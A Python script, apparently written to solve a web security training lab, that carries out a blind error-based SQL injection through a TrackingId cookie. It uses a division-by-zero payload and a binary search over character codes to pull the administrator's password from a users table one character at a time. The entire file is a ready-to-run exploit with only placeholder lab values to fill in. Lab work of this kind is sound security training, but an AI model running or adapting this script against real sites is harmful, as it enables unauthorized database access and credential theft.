#!/usr/bin/env python3
import requests

HOST = "https://YOUR-LAB-ID.web-security-academy.net"  # <-- update with your lab URL
SESSION_COOKIE = "YOUR-SESSION-COOKIE"                   # <-- update with a fresh session cookie
PASSWORD_LENGTH = 20
USERNAME = "administrator"

def make_request(condition_sql):
    # TRUE condition -> division by zero -> 500 error
    # FALSE condition -> empty string -> 200 OK
    payload = f"'||(SELECT CASE WHEN ({condition_sql}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='{USERNAME}')||'"
    cookies = {"TrackingId": payload, "session": SESSION_COOKIE}
    resp = requests.get(f"{HOST}/filter", params={"category": "Accessories"}, cookies=cookies)
    return resp.status_code == 500

def get_char_ascii(position):
    low, high = 32, 126

    if position > 1:
        is_true = make_request(f"LENGTH(password)>={position}")
        if not is_true:
            return None

    while low < high:
        mid = (low + high + 1) // 2
        condition = f"ASCII(SUBSTR(password,{position},1))>{mid - 1}"
        is_true = make_request(condition)
        if is_true:
            low = mid
        else:
            high = mid - 1
    return low

def main():
    password = ""
    print("Cracking administrator password (error-based)...\n")
    for pos in range(1, PASSWORD_LENGTH + 1):
        code = get_char_ascii(pos)
        if code is None:
            print(f"\nReached end of password at position {pos}.")
            break
        char = chr(code)
        password += char
        print(f"Position {pos}: ASCII {code} -> '{char}'   (so far: {password})")
    print(f"\nFinal password: {password}")

if __name__ == "__main__":
    main()
